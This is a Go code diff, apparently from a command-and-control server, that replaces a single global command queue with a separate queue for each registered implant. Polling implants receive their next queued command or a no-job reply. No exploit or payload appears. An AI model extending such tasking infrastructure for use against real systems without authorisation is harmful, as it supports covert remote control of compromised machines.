@@ -22,9 +22,8 @@ type LS struct {
 }
 
 var (
-	agent_arr      []*Common.Implant
-	g_clientobj    Common.Client
-	gAgentCmdQueue Common.Queue
+	agent_arr   []*Common.Implant //EACH AGENT HAS THEIR OWN CMD QUEUE
+	g_clientobj Common.Client
 )
 
 func ProcessRequest(c *gin.Context) {
@@ -109,7 +108,14 @@ func ProcessRequest(c *gin.Context) {
 			AgentCmd.CmdID = Common.CMD_Register
 			AgentCmd.RequestID = data_package.RequestID + 1
 			AgentCmd.DataBuffer = nil
-			gAgentCmdQueue.PreemptQueue(AgentCmd)
+
+			for _, agent := range agent_arr {
+				if agent.Context.Agent_name == data_package.AgentName {
+					agent.CmdQue.PreemptQueue(AgentCmd)
+
+				}
+			}
+
 		}
 
 		//parse data
@@ -128,30 +134,36 @@ func ProcessRequest(c *gin.Context) {
 			c.JSON(http.StatusInternalServerError, "Internal Server Error")
 		}
 
-		if len(gAgentCmdQueue) == 0 {
-
-			AgentCmd.CmdID = Common.CMD_NO_JOB
-			AgentCmd.RequestID = data_package.RequestID + 1
-			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
-
-		} else {
-			var (
-				value interface{}
-				ok    bool
-			)
-			value, err = gAgentCmdQueue.Dequeue()
-			if err != nil {
-				log.Println("[error] attempting to dequeue agent command", err)
-				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
-			}
-			if AgentCmd, ok = value.(Common.AgentCmd); ok {
+		for _, agent := range agent_arr {
+			if (agent.Context.Agent_name == data_package.AgentName) && agent.CmdQue.Len() == 0 {
+				AgentCmd.CmdID = Common.CMD_NO_JOB
+				AgentCmd.RequestID = data_package.RequestID + 1
 				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
-			} else {
-				log.Println("[error] attempting to cast value to AgentCmd")
-				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
-			}
 
+			} else if (agent.Context.Agent_name == data_package.AgentName) && agent.CmdQue.Len() > 0 {
+
+				var (
+					value interface{}
+					ok    bool
+				)
+
+				value, err = agent.CmdQue.Dequeue()
+				if err != nil {
+					log.Println("[error] attempting to dequeue agent command", err)
+					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+				}
+
+				if AgentCmd, ok = value.(Common.AgentCmd); ok {
+					c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
+
+				} else {
+
+					log.Println("[error] attempting to cast value to AgentCmd")
+					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+				}
+			}
 		}
+
 		break // CMD_GET_JOB
 
 	default:
